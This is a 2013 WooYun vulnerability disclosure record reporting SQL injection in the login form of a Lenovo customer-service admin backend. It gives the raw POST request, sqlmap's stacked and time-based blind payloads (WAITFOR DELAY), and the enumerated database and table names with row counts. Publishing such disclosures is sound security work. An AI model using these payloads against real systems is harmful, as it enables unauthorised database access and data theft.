{"id": 6241, "wybug_id": "wooyun-2013-046514", "wybug_title": "联想某信息管理后台存在SQL注射导致信息泄露", "wybug_corp": "联想", "wybug_author": "Mr.leo", "wybug_date": "2013-12-20 11:19", "wybug_open_date": "2014-02-03 11:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-03：\t细节向公众公开  简要描述： 联想7#某信息管理后台存在SQL注射导致信息泄露 详细说明：  站点：http://ideaservice.lenovo.com.cn/ts/login.aspx 联想MIDH客服部技术端到端平台信息管理后台 LoginName参数没有过滤，导致注射漏洞\nPOST http://ideaservice.lenovo.com.cn/ts/login.aspx HTTP/1.1Host: ideaservice.lenovo.com.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://ideaservice.lenovo.com.cn/ts/login.aspxConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 244__VIEWSTATE=%2FwEPDwUJNjk4MTA0ODg0ZGQjzDTIBgYIZMEoAC%2BXVcVLiQIr1w%3D%3D&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=%2FwEWBAK3i8XBBALM2PtaAsLYi9UKAoznisYG2dv0T95jFAxGW%2FpL7CC%2BymOQ9AM%3D&LoginName=123&LoginPass=123&Button1=%C8%B7%B6%A8\nsqlmap跑起来\nsqlmap identified the following injection points with a total of 108 HTTP(s) requests:---Place: POSTParameter: LoginName    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUJNjk4MTA0ODg0ZGQjzDTIBgYIZMEoAC+XVcVLiQIr1w==&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=/wEWBAK3i8XBBALM2PtaAsLYi9UKAoznisYG2dv0T95jFAxGW/pL7CC+ymOQ9AM=&LoginName=123'; WAITFOR DELAY '0:0:5';--&LoginPass=123&Button1=ȷ��    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUJNjk4MTA0ODg0ZGQjzDTIBgYIZMEoAC+XVcVLiQIr1w==&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=/wEWBAK3i8XBBALM2PtaAsLYi9UKAoznisYG2dv0T95jFAxGW/pL7CC+ymOQ9AM=&LoginName=123' WAITFOR DELAY '0:0:5'--&LoginPass=123&Button1=ȷ��---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: LoginName    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUJNjk4MTA0ODg0ZGQjzDTIBgYIZMEoAC+XVcVLiQIr1w==&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=/wEWBAK3i8XBBALM2PtaAsLYi9UKAoznisYG2dv0T95jFAxGW/pL7CC+ymOQ9AM=&LoginName=123'; WAITFOR DELAY '0:0:5';--&LoginPass=123&Button1=ȷ��    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUJNjk4MTA0ODg0ZGQjzDTIBgYIZMEoAC+XVcVLiQIr1w==&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=/wEWBAK3i8XBBALM2PtaAsLYi9UKAoznisYG2dv0T95jFAxGW/pL7CC+ymOQ9AM=&LoginName=123' WAITFOR DELAY '0:0:5'--&LoginPass=123&Button1=ȷ��---current user:    'db_ts'current database:    'ts'available databases [13]:[*] [tempdb\\x03][*] LeSupportSite[*] LoadTest2010[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] spadmin[*] sychronkzation3357[*] Test_LeAskAD[*] Test_LeSupportSite[*] tsDatabase: ts[31 tables]+----------------------------+| dbo.T_APP_LOG              || dbo.T_ENGINEIR             || dbo.T_ENG_LEVEL            || dbo.T_ENG_LEVEL_TYPE       || dbo.T_NEW_PRODUCT_INFO     || dbo.T_PREPARE_JOB_ITEM     || dbo.T_PREPARE_REC          || dbo.T_PREPARE_REC_DETAIL   || dbo.T_PROaUCT_PREPARE      || dbo.T_REC                  || dbo.T_SOFTWARE             || dbo.T_SOFTWARE_YEC         || dbo.T_SOLUTION             || dbo.T_SOLUTION_REC         || dbo.T_SURVEY               || dbo.T_SURVEY_QUESTION      || dbo.T_SURVEY_REPLY         || dbo.T_SURVEY_REPLY_DETAIL  || dbo.T_SURVEY_TARGET        || dbo.T_SYS_USER             || dbo.T_TROUBLE_SHOOTING_REC || dbo.T_TROUBLE_SHOOTINH     || dbo.T_USER_RIGHTS          || dbo.V_NEW_PRODUCT          || dbo.V_PRODUCT_PREPARE      || dbo.V_SOFTWARE_REC         || dbo.V_SOLUTION_RGC         || dbo.V_SURVEY_REC           || dbo.[T_APK`VERSION]        || dbo.[T_MODEL\\x03]          || dbo.dtproperties           |+----------------------------+Database: ts+---------------------------+---------+| Table                     | Entries |+---------------------------+---------+| dbo.T_PREPARE_REC_DETAIL  | 395421  || dbo.T_SOLUTION_REC        | 269069  || dbo.T_PREPARE_REC         | 137342  || dbo.T_SURVEY_REPLY_DETAIL | 27927   || dbo.T_ENG_LEVEL           | 23672   || dbo.T_SURVEY_REPLY        | 19036   || dbo.T_SOFTWARE            | 501     || dbo.T_SOLUTION            | 449     || dbo.T_NEW_PRODUCT_INFO    | 89      || dbo.T_REC                 | 70      || dbo.T_SURVEY_QUESTION     | 44      || dbo.T_TROUBLE_SHOOTINH    | 41      || dbo.T_SURVEY              | 5       || dbo.T_ENGINEIR            | 4       || dbo.T_PREPARE_JOB_ITEM    | 3       || dbo.T_USER_RIGHTS         | 3       |+---------------------------+---------+\nover   漏洞证明：  已经证明   修复方案：  过滤参数   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-12-22 19:40 厂商回复： 感谢您对联想安全做出的贡献！我们将立即评估与修复相关漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-20 15:37 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @xsser @Finger @疯狗 谁把我标题编号去了？？    \n     2013-12-20 15:45 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @Mr.leo 标题尽量标准，规范一些吧    \n     2013-12-20 15:49 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @疯狗 改了以后果然标准规范了 -@-  http://www.wooyun.org/bugs/wooyun-2013-046540/trace/2db895ec0d5b19bee91b4c54952ac835 求审核    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}